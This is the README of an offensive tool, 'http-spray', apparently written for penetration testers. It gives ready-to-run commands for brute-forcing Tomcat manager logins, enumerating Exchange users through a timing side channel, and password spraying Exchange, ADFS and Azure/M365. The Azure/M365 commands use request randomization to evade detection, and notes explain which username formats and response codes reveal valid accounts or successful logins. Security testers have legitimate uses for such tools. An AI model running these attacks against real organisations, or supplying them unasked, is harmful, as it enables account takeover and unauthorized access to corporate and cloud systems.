# http-spray

## Setup

Install with [pipx](https://github.com/pypa/pipx/).

~~~ bash
pipx install git+https://github.com/dadevel/http-spray.git
~~~

## Usage

Basic example: Brute force Tomcat manager login.

~~~ bash
curl -LO https://github.com/dadevel/wordlists/raw/main/passwords/tomcat-credentials.txt
http-spray -t https://app.corp.com/tomcat/manager/html -m basic -c ./tomcat-credentials.txt | tee -a ./http-spray.json | jq -c 'select(.status_code != 401)'
~~~

Get notifications on success trough [ntfy.sh](https://ntfy.sh).
The notifications contain no personal data.

~~~ bash
http-spray -t https://app.corp.com/admin -m basic -u ./default-usernames.txt -p 'changeme' --notify https://ntfy.sh/$(uuidgen -r)
~~~

### Exchange

Time-based user enumeration against on-prem Exchange server.
Requests for valid users take about 0.1s, invalid users take more than 1.5s.

~~~ bash
http-spray -t https://mail.corp.com/rpc/ -m basic -u ./users.txt -p '' | tee -a ./http-spray.json | jq -c 'select(.time < 0.5)'
~~~

> **Note:**
>
> The user enumeration requires basic authentication and seems to work only with the user formats `corp\jdoe` and `corp.com\jdoe` where `jdoe` is the *samaccountname*.

Password spraying against on-prem Exchange server.

~~~ bash
http-spray -t https://mail.corp.com/rpc/ -m ntlm ./users.txt -p 'Summer2023#' | tee -a ./http-spray.json | jq -c 'select(.status_code != 401)'
~~~

> **Note:**
>
> The RPC endpoint returns 404 for successful logins.
> For alternate endpoints see [here](https://github.com/dadevel/wordlists/raw/main/windows/exchange.txt).
>
> Furthermore Exchange accepts the following username formats: `jdoe`, `corp\jdoe`, `corp.com\jdoe` and `jdoe@corp.com` where `jdoe` is the *samaccountname*.
> Depending on the environment the *mail* attribute, e.g. `john.doe@corp.com`, might work for the OWA web login.

### ADFS

Password spraying against ADFS trough NTLM authentication.

~~~ bash
http-spray -t https://sts.corp.com/adfs/services/trust/2005/windowstransport -m ntlm -u ./users.txt -p 'Summer2023!' -p 'Winter2023!' | tee -a ./http-spray.json
~~~

Password spraying against ADFS trough OAuth2 password grant.

~~~ bash
http-spray -t https://sts.corp.com/adfs/oauth2/token -m oauth --client-id 11111111-2222-3333-4444-555555555555 --resource https://app.corp.com/ -u ./users.txt -p 'Summer2023!' -p 'Winter2023!' | tee -a ./http-spray.json | jq -c 'select(.status_code == 200)'
~~~

> **Note:**
>
> ADFS accepts the following username formats: `corp\jdoe`, `corp.com\jdoe` and `jdoe@corp.com` where `jdoe` is the *samaccountname*.
> Depending on the environment the *mail* attribute, e.g. `john.doe@corp.com`, might work as well.

### Microsoft Cloud

Password spraying against Azure/M365 trough OAuth2 password grant.

~~~ bash
http-spray -t https://login.windows.net/corp.com/oauth2/token -m msauth --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://graph.windows.net -u ./users.txt -p 'Summer@2024' | tee -a ./http-spray.json
~~~

Password spraying against Azure/M365 with full request randomization.

~~~ bash
http-spray -t https://login.microsoftonline.com/corp.com/oauth2/token -m msauth --user-agents ./wordlists/desktop-user-agents.csv --client-id ./wordlists/m365-public-clients.csv --resource ./wordlists/m365-resources.csv -u ./users.txt -p ./passwords.txt | tee -a ./http-spray.json
~~~

> **Note:**
>
> The username must be specified as email address, e.g. `john.doe@corp.com`.
